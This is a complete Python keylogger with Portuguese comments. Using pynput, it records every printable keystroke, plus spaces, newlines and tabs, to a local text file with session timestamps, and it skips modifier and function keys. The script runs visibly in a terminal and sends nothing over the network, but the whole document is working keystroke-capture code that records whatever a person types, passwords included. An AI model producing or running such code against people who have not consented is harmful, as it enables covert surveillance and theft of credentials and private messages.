from pynput import keyboard
import datetime
import os

# Configurações
ARQUIVO_LOG = "log_teclas.txt"
ARQUIVO_TEMP = "log_teclas_temp.txt"  # Para restauração se corromper

# Mapeamento de teclas especiais para representação legível
TECLAS_ESPECIAIS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
}

# Conjunto de teclas que devem ser IGNORADAS
TECLAS_IGNORADAS = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.alt,
    keyboard.Key.alt_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_gr,
    keyboard.Key.cmd,
    keyboard.Key.cmd_r,
    keyboard.Key.caps_lock,
    keyboard.Key.num_lock,
    keyboard.Key.scroll_lock,
    keyboard.Key.insert,
    keyboard.Key.delete,
    keyboard.Key.home,
    keyboard.Key.end,
    keyboard.Key.page_up,
    keyboard.Key.page_down,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
    keyboard.Key.esc,
    keyboard.Key.print_screen,
    keyboard.Key.pause,
    keyboard.Key.media_play_pause,
    keyboard.Key.media_volume_up,
    keyboard.Key.media_volume_down,
    keyboard.Key.media_volume_mute,
    keyboard.Key.media_next,
    keyboard.Key.media_previous,
}

# Teclas de função (F1-F12) também ignoradas
for i in range(1, 13):
    if hasattr(keyboard.Key, f"f{i}"):
        TECLAS_IGNORADAS.add(getattr(keyboard.Key, f"f{i}"))


def garantir_arquivo_existe():
    """Cria o arquivo de log se não existir."""
    if not os.path.exists(ARQUIVO_LOG):
        with open(ARQUIVO_LOG, "w", encoding="utf-8") as f:
            f.write("")
        # Cria backup temporário
        with open(ARQUIVO_TEMP, "w", encoding="utf-8") as f:
            f.write("")


def salvar_tecla(conteudo: str):
    """Salva uma tecla no arquivo de forma segura (com flush imediato)."""
    try:
        with open(ARQUIVO_LOG, "a", encoding="utf-8") as f:
            f.write(conteudo)
            f.flush()
            os.fsync(f.fileno())  # Garante que os dados foram gravados no disco
    except Exception as e:
        print(f"[ERRO] Falha ao salvar tecla: {e}")


def deve_ignorar(tecla) -> bool:
    """Verifica se a tecla deve ser ignorada."""
    if tecla in TECLAS_IGNORADAS:
        return True
    return False


def ao_pressionar(tecla):
    """Callback executado quando uma tecla é pressionada."""
    try:
        # Ignora teclas especiais da lista negra
        if deve_ignorar(tecla):
            return

        # Teclas especiais permitidas (space, enter, tab)
        if tecla in TECLAS_ESPECIAIS:
            salvar_tecla(TECLAS_ESPECIAIS[tecla])
            return

        # Teclas de caractere normal (letras, números, símbolos)
        if hasattr(tecla, "char") and tecla.char is not None:
            caractere = tecla.char
            # Filtra: aceita letras, números e caracteres especiais (imprimíveis)
            if caractere.isprintable() and not caractere.isspace() or caractere in (" ",):
                salvar_tecla(caractere)
                return
            # Aceita espaços explícitos
            if caractere == " ":
                salvar_tecla(caractere)
                return

    except Exception as e:
        print(f"[ERRO] Callback de tecla: {e}")


def iniciar():
    """Inicia o listener do teclado."""
    garantir_arquivo_existe()

    data_inicio = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cabecalho = f"\n{'='*50}\n=== Sessão iniciada em: {data_inicio} ===\n{'='*50}\n"
    salvar_tecla(cabecalho)

    print(f"[INFO] Captura iniciada. Salvando em: {ARQUIVO_LOG}")
    print("[INFO] Pressione Ctrl+C no terminal para encerrar.\n")

    try:
        with keyboard.Listener(on_press=ao_pressionar) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n[INFO] Encerrando captura...")
    finally:
        rodape = f"\n{'='*50}\n=== Sessão encerrada em: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n"
        salvar_tecla(rodape)
        print(f"[INFO] Log salvo em: {ARQUIVO_LOG}")


if __name__ == "__main__":
    iniciar()
    